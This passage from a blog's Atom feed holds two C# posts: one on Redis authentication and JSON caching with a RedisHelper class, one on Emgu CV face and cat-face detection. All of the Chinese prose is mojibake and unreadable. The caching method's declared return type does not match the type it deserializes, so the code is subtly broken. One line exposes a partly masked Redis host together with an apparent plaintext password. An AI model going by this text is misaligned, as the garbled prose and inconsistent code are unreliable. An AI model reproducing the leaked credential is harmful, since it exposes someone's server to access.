ä¼šè¿”å›ç±»ä¼¼å¦‚ä¸‹çš„é”™è¯¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(error) NOAUTH Authentication required.</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ AUTH å‘½ä»¤éªŒè¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli</span><br><span class="line">&gt; auth your_secure_password</span><br><span class="line">OK</span><br><span class="line">&gt; get key</span><br></pre></td></tr></table></figure><p>å¦‚æœå¯†ç æ­£ç¡®ï¼Œåç»­æ“ä½œå°†ç”Ÿæ•ˆã€‚</p><h2 id="5-é“¾æ¥ä¿®æ”¹"><a href="#5-é“¾æ¥ä¿®æ”¹" class="headerlink" title="5. é“¾æ¥ä¿®æ”¹"></a>5. é“¾æ¥ä¿®æ”¹</h2><p>199.x.x.xxx:6379,password&#x3D;123X.zx  æ›´æ”¹redisé“¾æ¥ </p><!--            private readonly int isRedis= ConfigManager.TempI115;  string tkuid = isRedis==1? _jwt.GetTokenFromRedis(token): _jwt.GetUid(_jwt.JwtDecrypt(token)) ; --><h1 id="redisç¼“å­˜json-RedisHelper"><a href="#redisç¼“å­˜json-RedisHelper" class="headerlink" title="redisç¼“å­˜json RedisHelper"></a>redisç¼“å­˜json RedisHelper</h1><p>æ–¹æ³•æ·»åŠ  Redis ç¼“å­˜ï¼Œå¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼æ‰©å±•ä»£ç ï¼š</p><h2 id="å®ç°æ€è·¯"><a href="#å®ç°æ€è·¯" class="headerlink" title="å®ç°æ€è·¯"></a>å®ç°æ€è·¯</h2><p>å®šä¹‰ Redis ç¼“å­˜é€»è¾‘ï¼š</p><p>å…ˆå°è¯•ä» Redis ç¼“å­˜ä¸­è¯»å–æ•°æ®ã€‚<br>å¦‚æœç¼“å­˜å‘½ä¸­ï¼Œåˆ™ç›´æ¥è¿”å›æ•°æ®ã€‚<br>å¦‚æœç¼“å­˜æœªå‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢æ•°æ®åº“ï¼Œå¤„ç†æ•°æ®åå­˜å…¥ Redisï¼Œå¹¶è®¾ç½®é€‚å½“çš„è¿‡æœŸæ—¶é—´ã€‚<br>å®šä¹‰ Redis é”®ï¼š</p><p>ä½¿ç”¨ä¸€ä¸ªå”¯ä¸€é”®ï¼Œä¾‹å¦‚ **CityInfoList:{id}**ï¼Œç¡®ä¿ç¼“å­˜åŒºåˆ†ä¸åŒ id çš„æ•°æ®ã€‚<br>åºåˆ—åŒ–å’Œååºåˆ—åŒ–ï¼š</p><p>ä½¿ç”¨ JSON æ ¼å¼å­˜å‚¨æ•°æ®ï¼Œæ–¹ä¾¿è·¨è¯­è¨€å’Œè·¨ç³»ç»Ÿçš„å…¼å®¹æ€§ã€‚<br>æ‰©å±•åçš„ä»£ç <br>ä»¥ä¸‹æ˜¯æ·»åŠ  Redis ç¼“å­˜åçš„å®Œæ•´å®ç°ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;CityInfoS&gt; <span class="title">FindIMCityInfoListByPIDS</span>(<span class="params"><span class="built_in">string</span> id</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// å®šä¹‰ Redis ç¼“å­˜é”®</span></span><br><span class="line">    <span class="built_in">string</span> redisKey = <span class="string">$&quot;IMCityInfoList:<span class="subst">&#123;id&#125;</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°è¯•ä» Redis è·å–æ•°æ®</span></span><br><span class="line">    <span class="built_in">string</span> cachedData = RedisHelper.GetString(redisKey); <span class="comment">// RedisHelper æ˜¯ Redis æ“ä½œå·¥å…·ç±»</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrEmpty(cachedData))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// å¦‚æœç¼“å­˜å‘½ä¸­ï¼Œååºåˆ—åŒ–å¹¶è¿”å›æ•°æ®</span></span><br><span class="line">        <span class="keyword">return</span> JsonConvert.DeserializeObject&lt;List&lt;IMCityInfoS&gt;&gt;(cachedData);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç¼“å­˜æœªå‘½ä¸­ï¼Œä»æ•°æ®åº“æŸ¥è¯¢</span></span><br><span class="line">    <span class="built_in">string</span> sql = <span class="string">@&quot;SELECT `CtId`, `Pid`, `PidS`, `CityCode`, `CityName`, </span></span><br><span class="line"><span class="string">                          `PostCode`, `AreaCode`, `Ctime`, `CtimeInt`, `LangType`, `HasSon`</span></span><br><span class="line"><span class="string">                   FROM `IMCityInfoS` </span></span><br><span class="line"><span class="string">                   WHERE PID = @PID&quot;</span>;</span><br><span class="line">    <span class="keyword">var</span> parameters = <span class="keyword">new</span> MySqlParameter[] &#123; <span class="keyword">new</span> MySqlParameter(<span class="string">&quot;@PID&quot;</span>, id) &#125;;</span><br><span class="line"></span><br><span class="line">    DataSet ds = DbHelperMySQL.Query(sql, parameters);</span><br><span class="line">    <span class="keyword">if</span> (ds != <span class="literal">null</span> &amp;&amp; ds.Tables[<span class="number">0</span>].Rows.Count &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// è½¬æ¢æŸ¥è¯¢ç»“æœä¸º JSON</span></span><br><span class="line">        <span class="built_in">string</span> json = JsonConvert.SerializeObject(ds.Tables[<span class="number">0</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// è®¾ç½®ç¼“å­˜å¹¶æŒ‡å®šè¿‡æœŸæ—¶é—´ï¼ˆä¾‹å¦‚30åˆ†é’Ÿï¼‰</span></span><br><span class="line">        RedisHelper.SetString(redisKey, json, TimeSpan.FromMinutes(<span class="number">30</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ååºåˆ—åŒ–ä¸ºå¯¹è±¡åˆ—è¡¨å¹¶è¿”å›</span></span><br><span class="line">        <span class="keyword">return</span> JsonConvert.DeserializeObject&lt;List&lt;IMCityInfoS&gt;&gt;(json);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœæŸ¥è¯¢æ— ç»“æœï¼Œè¿”å›ç©º</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="RedisHelper-å·¥å…·ç±»"><a href="#RedisHelper-å·¥å…·ç±»" class="headerlink" title="RedisHelper å·¥å…·ç±»"></a>RedisHelper å·¥å…·ç±»</h2><p>å¦‚æœä½ å°šæœªå®ç° RedisHelperï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ç¤ºä¾‹ä»£ç ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> StackExchange.Redis;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title">RedisHelper</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> ConnectionMultiplexer redis = ConnectionMultiplexer.Connect(<span class="string">&quot;localhost&quot;</span>); <span class="comment">// æ›¿æ¢ä¸ºä½ çš„ Redis åœ°å€</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">readonly</span> IDatabase db = redis.GetDatabase();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è·å–å­—ç¬¦ä¸²æ•°æ®</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">GetString</span>(<span class="params"><span class="built_in">string</span> key</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> db.StringGet(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¾ç½®å­—ç¬¦ä¸²æ•°æ®å¹¶æŒ‡å®šè¿‡æœŸæ—¶é—´</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">SetString</span>(<span class="params"><span class="built_in">string</span> key, <span class="built_in">string</span> <span class="keyword">value</span>, TimeSpan? expiry = <span class="literal">null</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        db.StringSet(key, <span class="keyword">value</span>, expiry);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨æ³¨æ„äº‹é¡¹"><a href="#ä½¿ç”¨æ³¨æ„äº‹é¡¹" class="headerlink" title="ä½¿ç”¨æ³¨æ„äº‹é¡¹"></a>ä½¿ç”¨æ³¨æ„äº‹é¡¹</h2><p>Redis è¿æ¥æ± ï¼šå®é™…ç”Ÿäº§ä¸­ï¼Œå»ºè®®ä½¿ç”¨ Redis è¿æ¥æ± æ¥ç®¡ç†è¿æ¥ï¼Œé¿å…è¿æ¥è¿‡å¤šå¯¼è‡´èµ„æºå ç”¨ã€‚<br>å¼‚å¸¸å¤„ç†ï¼šåœ¨ Redis è¯»å†™æ“ä½œä¸­ï¼Œæ·»åŠ å¼‚å¸¸æ•è·é€»è¾‘ï¼Œç¡®ä¿å³ä½¿ Redis å‡ºç°é—®é¢˜ï¼Œä¹Ÿä¸ä¼šå½±å“æ•°æ®åº“æŸ¥è¯¢ã€‚<br>è¿‡æœŸæ—¶é—´ï¼šæ ¹æ®ä¸šåŠ¡éœ€æ±‚è®¾ç½®åˆç†çš„è¿‡æœŸæ—¶é—´ï¼Œé¿å…ç¼“å­˜æ•°æ®è¿‡æœŸæˆ–æ— æ•ˆã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Redis-JWT&quot;&gt;&lt;a href=&quot;#Redis-JWT&quot; class=&quot;headerlink&quot; title=&quot;Redis JWT&quot;&gt;&lt;/a&gt;Redis JWT&lt;/h1&gt;&lt;p&gt;åœ¨ .NET ä¸­ä½¿ç”¨ Redis æ¥å­˜å‚¨ JWTï¼ˆJSON Web Tokenï¼‰å¯ä»¥</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="jwt" scheme="https://banjinmei.github.io/tags/jwt/"/>
    
    <category term="token" scheme="https://banjinmei.github.io/tags/token/"/>
    
    <category term="redis" scheme="https://banjinmei.github.io/tags/redis/"/>
    
  </entry>
  
  <entry>
    <title>cashrp opencv</title>
    <link href="https://banjinmei.github.io/2024/12/03/cashrp-opencv/"/>
    <id>https://banjinmei.github.io/2024/12/03/cashrp-opencv/</id>
    <published>2024-12-02T17:15:38.000Z</published>
    <updated>2024-12-02T17:17:14.106Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Emgu-CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚"><a href="#Emgu-CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚" class="headerlink" title="Emgu CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚"></a>Emgu CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚</h1><p>äººè„¸æ£€æµ‹æ˜¯æŒ‡å®šä½å›¾åƒä¸­çš„äººè„¸ä½ç½®ï¼Œè€Œäººè„¸è¯†åˆ«æ˜¯æŒ‡ç¡®è®¤æˆ–éªŒè¯è¿™äº›è„¸å­”çš„èº«ä»½ã€‚ä¸ºäº†å®ç°äººè„¸è¯†åˆ«ï¼Œéœ€è¦è®­ç»ƒä¸€ä¸ªæ¨¡å‹ï¼Œæˆ–è€…ä½¿ç”¨é¢„è®­ç»ƒçš„æ¨¡å‹ã€‚</p><h1 id="å®‰è£…-Emgu-CV"><a href="#å®‰è£…-Emgu-CV" class="headerlink" title="å®‰è£… Emgu CV"></a>å®‰è£… Emgu CV</h1><p>é¦–å…ˆï¼Œéœ€è¦é€šè¿‡NuGetå®‰è£…Emgu CVåŒ…ã€‚å¯ä»¥é€šè¿‡Visual Studioçš„NuGetåŒ…ç®¡ç†å™¨æ¥å®‰è£…ï¼š</p><p>æ‰“å¼€çš„C#é¡¹ç›®ã€‚<br>å³é”®ç‚¹å‡»è§£å†³æ–¹æ¡ˆèµ„æºç®¡ç†å™¨ä¸­çš„é¡¹ç›®åç§°ï¼Œé€‰æ‹©â€œç®¡ç†NuGetç¨‹åºåŒ…â€ã€‚</p><h2 id="æœç´¢å¹¶å®‰è£…Emgu-CVå’ŒEmgu-CV-runtime-windowsã€‚"><a href="#æœç´¢å¹¶å®‰è£…Emgu-CVå’ŒEmgu-CV-runtime-windowsã€‚" class="headerlink" title="æœç´¢å¹¶å®‰è£…Emgu.CVå’ŒEmgu.CV.runtime.windowsã€‚"></a>æœç´¢å¹¶å®‰è£…Emgu.CVå’ŒEmgu.CV.runtime.windowsã€‚</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åŠ è½½äººè„¸æ£€æµ‹åˆ†ç±»å™¨</span></span><br><span class="line">CascadeClassifier faceCascade = <span class="keyword">new</span> CascadeClassifier(<span class="string">&quot;haarcascade_frontalface_default.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å–è¾“å…¥å›¾åƒ</span></span><br><span class="line">Image&lt;Bgr, <span class="built_in">byte</span>&gt; inputImage = <span class="keyword">new</span> Image&lt;Bgr, <span class="built_in">byte</span>&gt;(<span class="string">&quot;face.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è½¬æ¢ä¸ºç°åº¦å›¾åƒï¼Œå› ä¸ºäººè„¸æ£€æµ‹é€šå¸¸åœ¨ç°åº¦å›¾åƒä¸Šè¿›è¡Œ</span></span><br><span class="line">Image&lt;Gray, <span class="built_in">byte</span>&gt; grayImage = inputImage.Convert&lt;Gray, <span class="built_in">byte</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿›è¡Œäººè„¸æ£€æµ‹</span></span><br><span class="line">Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, <span class="number">1.1</span>, <span class="number">3</span>, Size.Empty);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨æ£€æµ‹åˆ°çš„äººè„¸å‘¨å›´ç»˜åˆ¶çŸ©å½¢æ¡†</span></span><br><span class="line"><span class="keyword">foreach</span> (Rectangle face <span class="keyword">in</span> faces)</span><br><span class="line">&#123;</span><br><span class="line">    inputImage.Draw(face, <span class="keyword">new</span> Bgr(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿å­˜æ ‡è®°åçš„å›¾åƒä¸ºoutput.jpg</span></span><br><span class="line">inputImage.Save(<span class="string">&quot;output.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">    Console.WriteLine(<span class="string">&quot;save~output.jpg&quot;</span>);</span><br></pre></td></tr></table></figure><p>xmlæ¥è‡ª <a class="link"   href="https://github.com/opencv/opencv/tree/master/data/haarcascades" >https://github.com/opencv/opencv/tree/master/data/haarcascades<i class="fas fa-external-link-alt"></i></a></p><h2 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h2><p>å¦‚æœæ²¡æœ‰ Emgu.CV.runtime.windows  åˆ™ä¼šåŠ è½½ä¸äº†xml</p><p>Exception ï¼šSystem.TypeInitializationException:â€œThe type initializer for â€˜Emgu.CV.CvInvokeâ€™ threw an exception.â€</p><p>æ£€æŸ¥è¿è¡Œæ—¶ä¾èµ– (opencv_world*.dll) æ˜¯å¦åŠ è½½æ­£ç¡®ã€‚<br>å®‰è£…æœ€æ–°çš„ VC++ Redistributableã€‚<br>ç¡®ä¿é¡¹ç›®ç›®æ ‡å¹³å°ä¸ Emgu.CV çš„ä¾èµ–é¡¹ä¸€è‡´ã€‚</p><h1 id="è¯†åˆ«çŒ«è„¸"><a href="#è¯†åˆ«çŒ«è„¸" class="headerlink" title="è¯†åˆ«çŒ«è„¸"></a>è¯†åˆ«çŒ«è„¸</h1><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åŠ è½½æ£€æµ‹åˆ†ç±»å™¨</span></span><br><span class="line">CascadeClassifier faceCascade = <span class="keyword">new</span> CascadeClassifier(<span class="string">&quot;haarcascade_frontalcatface.xml&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯»å–è¾“å…¥å›¾åƒ</span></span><br><span class="line">Image&lt;Bgr, <span class="built_in">byte</span>&gt; inputImage = <span class="keyword">new</span> Image&lt;Bgr, <span class="built_in">byte</span>&gt;(<span class="string">&quot;cat2.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è½¬æ¢ä¸ºç°åº¦å›¾åƒï¼Œå› ä¸ºäººè„¸æ£€æµ‹é€šå¸¸åœ¨ç°åº¦å›¾åƒä¸Šè¿›è¡Œ</span></span><br><span class="line">Image&lt;Gray, <span class="built_in">byte</span>&gt; grayImage = inputImage.Convert&lt;Gray, <span class="built_in">byte</span>&gt;();</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¿›è¡Œäººè„¸æ£€æµ‹</span></span><br><span class="line">Rectangle[] faces = faceCascade.DetectMultiScale(grayImage, <span class="number">1.1</span>, <span class="number">3</span>, Size.Empty);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åœ¨æ£€æµ‹åˆ°çš„äººè„¸å‘¨å›´ç»˜åˆ¶çŸ©å½¢æ¡†</span></span><br><span class="line"><span class="keyword">foreach</span> (Rectangle face <span class="keyword">in</span> faces)</span><br><span class="line">&#123;</span><br><span class="line">    inputImage.Draw(face, <span class="keyword">new</span> Bgr(<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>), <span class="number">3</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ä¿å­˜æ ‡è®°åçš„å›¾åƒä¸ºoutput.jpg</span></span><br><span class="line">inputImage.Save(<span class="string">&quot;output.jpg&quot;</span>);</span><br><span class="line"></span><br><span class="line">Console.WriteLine(<span class="string">&quot;save~output.jpg&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Emgu-CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚&quot;&gt;&lt;a href=&quot;#Emgu-CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚&quot; class=&quot;headerlink&quot; title=&quot;Emgu CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚&quot;&gt;&lt;/a&gt;Emgu CVè¿›è¡ŒåŸºæœ¬çš„äººè„¸æ£€æµ‹ã€‚&lt;/h1&gt;&lt;p&gt;äººè„¸æ£€æµ‹æ˜¯æŒ‡å®šä½å›¾åƒ</summary>
      
    
    
    
    <category term="æŠ€æœ¯" scheme="https://banjinmei.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term=".net" scheme="https://banjinmei.github.io/tags/net/"/>
    
    <category term="csharp" scheme="https://banjinmei.github.io/tags/csharp/"/>
    
    <category term="opencv" scheme="https://banjinmei.github.io/tags/opencv/"/>
    
    <category term="emgu" scheme="https://banjinmei.github.io/tags/emgu/"/>
    
  </entry>
  
</feed>
